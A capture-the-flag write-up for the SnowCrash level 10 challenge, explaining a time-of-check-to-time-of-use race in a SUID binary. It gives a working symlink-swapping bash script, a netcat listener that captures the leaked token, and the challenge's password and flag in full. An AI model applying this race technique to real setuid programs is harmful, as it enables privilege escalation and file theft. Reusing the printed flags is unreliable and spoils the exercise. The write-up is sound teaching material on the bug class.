# 🔐 Level 10

> **Category:** Race Condition (TOCTOU)  
> **Difficulty:** ⭐⭐⭐⭐☆  
> **Key Technique:** Time-of-check to time-of-use vulnerability

---

## 📋 Overview

A SUID binary uses `access()` to check file permissions before `open()`. We exploit the race condition between these two calls.

---

## 🔍 Reconnaissance

### Initial Discovery

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

### Decompiled Source (simplified)

```c
int main(int argc, char **argv) {
    char *path = argv[1];
    char *host = argv[2];
    
    // VULNERABILITY: Time gap between check and use!
    if (access(path, R_OK) != 0) {
        printf("You don't have access to %s\n", path);
        return 1;
    }
    
    // ... connect to host:6969 ...
    
    int fd = open(path, O_RDONLY);  // ← File opened AFTER check
    // ... read and send file contents ...
}
```

---

## 💡 Vulnerability Analysis

From the `access()` man page:

> [!WARNING]
> **Using access() to check if a user is authorized to open a file before actually doing so using open() creates a security hole**, because the user might exploit the short time interval between checking and opening the file to manipulate it.

**The Attack:**
1. `access()` checks a file we **can** read
2. Before `open()`, we swap it with a symlink to `token`
3. `open()` reads `token` instead

---

## 🎯 Exploitation

### The Race Script

```bash
#!/bin/bash
# getflag.sh - Rapidly swap symlink during race window

random_file=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 25)
link_name=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 25)

touch /tmp/$random_file

# Constantly execute the binary
while true; do
    /home/user/level10/level10 /tmp/$link_name 127.0.0.1 &>/dev/null
done &

# Constantly swap the symlink
while true; do
    ln -fs /home/user/level10/token /tmp/$link_name
    ln -fs /tmp/$random_file /tmp/$link_name
done
```

### Setting Up the Listener

In a separate terminal, listen for incoming connections:

```bash
# Loop to catch the race condition success
while true; do 
    nc.traditional -l -p 6969 | grep -v '.*( )*.'
done
```

### Running the Attack

```bash
# Terminal 1: Start listener
level10@SnowCrash:~$ while true; do nc.traditional -l -p 6969 | grep -v '.*( )*.'; done

# Terminal 2: Run race script
level10@SnowCrash:~$ bash /tmp/getflag.sh
```

After several attempts, the token appears:

```
woupa2yuojeeaaed06riuj63c
```

### Obtaining the Password

```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| flag10 Password | `woupa2yuojeeaaed06riuj63c` |
| Token | `feulo4b72j7edeahuete3no7c` |

---

## 📚 References

- [TOCTOU Race Condition](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
- [access() man page warning](https://linux.die.net/man/2/access)
- [Netcat - man page](https://linux.die.net/man/1/nc)